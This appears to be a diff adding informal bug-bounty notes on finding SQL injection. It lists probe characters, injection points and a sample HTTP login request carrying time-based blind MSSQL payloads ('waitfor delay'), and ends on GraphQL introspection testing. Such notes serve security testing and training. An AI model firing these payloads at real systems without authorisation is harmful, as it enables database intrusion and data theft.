@@ -1,0 +1,99 @@
+what can you do with sqli ?
+you can fetch data from db 
+you can insert data to db 
+you can perform rce if the user is db admin 
+you can upload files to remote server 
+
+it depends fro mscenarios to scenario what can be done 
+
+how to find 
+
+chars to test for sqli 
+'
+"
+`
+')
+")
+'))
+"))
+`)
+`))
+
+
+where can be found -- get n post params 
++ headers such as accept-language 
+authentication forms 
+path based inputs such as 
+/api/users/99 
+here 99 represents the id param 
+/api/users/99' 
+/api/users/99"
+etc. 
+
+try to look n understand what is being sent to db 
+
+
+Blind SQLi via GET param 
+sample get rqst 
+-------------------------------------------
+POST /login.asp?languagecode=EN HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-Reuested-With: XMLHttpRequest
+Referer: https:/abcd.comasdads
+Connection: keep-alive
+Cookie: aspsess=asdasd3qeq3d3d3d
+Auhthorization: Basic ew83rydh8923yr892h9823==
+Accept: */*
+Accept-encoding: gzip.deflate
+Cotent-Length: 39
+Host: website
+USer-Agent: mozillaa aaaaaa
+
+mode=asasa&passs=21212&uid=211212
+----------------------------------------------
+how to approach for sqli here 
+put ' in each and every header field and parameter here in the request 
+
+languagecode param may come out to be vuln. 
+if you only test for error based injection you will miss this injection here 
+
+as this is vuln to time based blind 
+
+
+-------------------------------------------
+POST /login.asp?languagecode=1'; waitfor delay '0:0:9'--  HTTP/1.1
+-------------------------------------------
+POST /login.asp?languagecode=EN';%20waitfor%20delay%20'0:0:9'%20--%20 HTTP/1.1
+-------------------------------------------
+POST /login.asp?languagecode=1'; waitfor delay '0:0:9' HTTP/1.1
+-------------------------------------------
+POST /login.asp?languagecode=1'; waitfor delay '0:0:9' HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-Reuested-With: XMLHttpRequest
+Referer: https:/abcd.comasdads
+Connection: keep-alive
+Cookie: aspsess=asdasd3qeq3d3d3d
+Auhthorization: Basic ew83rydh8923yr892h9823==
+Accept: */*
+Accept-encoding: gzip.deflate
+Cotent-Length: 39
+Host: website
+USer-Agent: mozillaa aaaaaa
+
+mode=asasa&passs=21212&uid=211212
+----------------------------------------------
+key takeaway:
+dont only look for simple error based injections single quote + error test go beyond 
+test for blind payloads as they are more wise spread 
+look for blind sqli payloads and utilize the mwhile hunting 
+
+
+Scenario 2: graphql sqli 
+see if request to graphql endpoint is being made 
+example endpoint 
+/abc/graphql/
+Q.1 first thing to test here is if graphql introspection query is allowed or not 
+Q.2 Can i find more methods to test 
+Q.3 is there any vuln in methods invoked here ?
+
+inql scanner burp extension can be added from github as well 
